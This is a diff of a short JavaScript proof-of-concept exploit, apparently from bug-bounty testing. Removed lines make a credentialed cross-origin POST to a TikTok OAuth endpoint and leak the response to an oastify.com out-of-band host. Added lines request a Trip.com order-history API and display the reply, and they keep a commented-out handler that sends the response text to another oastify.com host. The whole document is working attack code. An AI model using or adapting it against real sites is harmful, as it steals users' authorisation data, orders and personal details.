@@ -1,10 +1,15 @@
-var xhr = new XMLHttpRequest();
-xhr.onload = reqListener; 
-xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cvideo.list.manage%2Clive.list%2Cuser.info.email%2Cvideo.list.no_watermark%2Ccomment.list%2Cvideo.list.private_ads.no_watermark%2Cuser.info.showcase%2Cuser.account.configure%2Ccomment.list.manage%2Cuser.info.phone&aid=1459&source=web&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fbklaaaaaaaaaaaaaaaaa%2Flogin%2F%3F_extra%3D");
-xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send();
+const xhr = new XMLHttpRequest();
+xhr.onload = reqListener
+xhr.open('POST', 'https://www.trip.com/restapi/soa2/10098/GetOrderWithBM.json');
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send('{"OrderStatusClassify":"All","PageIndex":1,"PageSize":15,"BizTypes":[],"FilterValidOrder":false,"BookingDateTime":"","BeginBookingDateTime":"","EndBookingDateTime":"","FilterRequiredOrderIDArray":[],"NeedOrderAmountDetail":false,"ClientVersion":"99.99","Channel":"IBUOnline","Locale":"en-XX","head":{"cid":"","ctok":"","cver":"1.0","lang":"01","sid":"","syscode":"09","auth":"","extension":[{"name":"protocal","value":"https"},{"name":"sequence","value":""}]}}');
+
+
+// function reqListener() {
+//     location='//f7nmrkkvcyh127bxvxw7lo6sqjwak08p.oastify.com/log?key='+this.responseText; 
+// };
 
 function reqListener() {
-    location='//h6o7nfp0x4i5l3nwdfvnrl6bi2otck09.oastify.com/log?key='+this.responseText; 
+    alert(this.responseText) 
+    console.log(this.responseText);
 };
